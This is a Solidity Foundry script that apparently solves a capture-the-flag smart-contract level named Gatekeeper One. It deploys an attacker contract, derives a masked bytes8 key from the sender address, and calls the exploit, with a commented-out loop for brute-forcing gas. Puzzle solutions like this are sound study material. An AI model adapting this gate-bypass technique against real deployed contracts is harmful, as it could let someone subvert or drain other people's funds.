// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/GatekeeperOne.sol";
import "../src/Attacker.sol";

contract GatekeeperOneScript is Script {
    address constant gatekeeperAddress = 0x66f2b971DAB1E06B15b97B7f3b70fB87e8ED074e;
    function run() external {
        address EOA = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker(gatekeeperAddress);
        //Attacker attacker = Attacker(0x03591C9f6F4080834FAB503d4AcA1479ba6A59bE);
        bytes8 addrKey = bytes8(uint64(uint160(EOA)));
        addrKey = addrKey << 48;
        addrKey = addrKey >> 48;
        addrKey = bytes8(uint64(addrKey) + 2 ** 32);
        console2.logBytes8(addrKey);
        //for (uint i = 5962; i < 5963; i++) {
        //   //try attacker.attack{gas: i + (5 * 8191)}(addrKey) {
        //    (bool res,) = address(attacker).call{gas: i + (5 * 8191)}(abi.encodeWithSignature("attack(bytes8)", addrKey)); //{
        //    if (res) {
        //        console.log("Success");
        //        console.log(i);
        //        break;
        //    }
        //   // console.log("Success");
        //   // console.log(i);
        //   //} catch {
        //   // //console.log("Fail");
        //   //}
        //    
        //}
        attacker.attack(addrKey);
        vm.stopBroadcast();
    }
}
